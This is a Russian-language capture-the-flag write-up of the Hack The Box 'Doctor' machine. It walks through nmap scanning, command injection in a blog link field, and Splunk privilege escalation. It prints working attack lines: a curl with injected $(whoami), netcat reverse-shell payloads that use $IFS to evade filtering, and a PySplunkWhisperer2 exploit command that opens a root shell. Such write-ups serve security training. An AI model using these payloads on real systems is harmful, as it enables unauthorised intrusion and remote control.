Дисклеймер.  
Все инструменты описанные в данной статье реальны, находятся в свободном доступе и используются специалистами по Информационной Безопасности для проведения тестирования на проникновение информационных систем компаний и предприятий. Автор статьи не занимается взломом и не поощряет подобных действий, все описанное ниже было выполнено на специально подготовленной для этого виртуальной машине.

Простенькая машина после долгого перерыва…
[[nmap]]

```bash
Nmap scan report for 10.10.10.209

Host is up (0.14s latency).

Not shown: 997 filtered ports

PORT STATE SERVICE VERSION

22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)

80/tcp open http Apache httpd 2.4.41 ((Ubuntu))

|http-server-header: Apache/2.4.41 (Ubuntu)

|http-title: Doctor

8089/tcp open ssl/http Splunkd httpd

| http-robots.txt: 1 disallowed entry

|/

|http-server-header: Splunkd

|http-title: splunkd

| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser

| Not valid before: 2020-09-06T15:57:27

|Not valid after: 2023-09-06T15:57:27

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Поехали. идем смотреть вебчик

МАААКСИМАЛЬНО скучный лендинг какой-то частной клиники… тест весь — рыба, ссылки никуда не ведут, [[gobuster]] интересное не показывает. Но, в контактах указан email с доменным именем в качестве хоста

редактируем **_/etc/hosts_**

заходим и смотрим, форма входа, уже лучше….  
Пробуем дефолтный набор логинов и паролей, ничего не выходит.  
пробуем sql инъекции [[SQLi]]…. не работает  
находим форму сброса пароля, выдает 500 и все тут, сейчас работать с этим, сложно, но посмотрим исходники, csrf_token имеется, тут вряд-ли прокатит, что-то сделать.  
окей, регаем пользователя, admin не дает, зато почта admin работает, а для входа нужна именно она, нда, дохлый номер, окей регаем что-нибудь….  
попадаем в платформу блога, видим возможность смены имени и почты, окей, пробуем все что умеем. Но помогает, пробуем разместить запись с простым текстом, работает, попробуем XSS [[Cross-site scripting]] h1 не работает script тоже, от отчаяния пробовал PHP, неудивительно, что не работает.  
В процессе переписки в вк заметил, что соц. сеть парсит ссылки и вставляет ролики с ютуба с превьюшками и. т. д. А что если передать туда невалидную ссылку, **Link is not correct**, бинго, лучше чем ничего, а если поднять свой вебчик?  
```bash
python -m SimpleHTTPServer  
```
пробуем, заходит, передать бы в запрос команду…  
чем можно создать запрос, очевидный ответ [[curl]].  
**Курнем мануалы…  
а если так,

```bash
nc -lvnp 1234  
curl http://10.10.14.xx/$(whoami)
```

Во, запрос содержит uid 1001(web), кажется у нас есть [[RCE]]

Самый банальный способ создать шелл — [[netcat]]  
простой payload не сработает, пробелы мешают… чем заменить?  
находим в мануалах **$IFS.**

```bash
nc -lvnp 1234  
curl http://10.10.14.xx:8000/$(nc.$IFS-e$IFS'/bin/sh'$IFS'10.10.14.xx'$IFS'1234')
```

А если так?  
Опа, есть шелл от имени web  
погнали  
по стандарту  
**sudo -l?  
**Увы, но не в этот раз, сходим посмотрим на **/home,** очевидно нужен другой юзер, под которым и работает админ.

прогоняем [[linpeas]], видим из интересного логи [[Apache]], скачаем  
смотрим access логи, вспоминаем про страницу восстановления пароля, мб админ использовал, grep -r нам в помощь находим пароль, подойдет?  
**su**

есть, мы можем сдать **user.txt**

остался privesc

[[linpeas]] увы ничего не показывает, попробуем записывать все что попадается,  
в итоге находим, что вся эта куча работает на [[Splunk]]  
гуглим эксплоит  
находим github

```bash
python PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.xx --username --password  --payload 'nc.traditional -e/bin/sh '10.10.14.xx' '1234''  
а ну попробуем…  
ROOTED!
```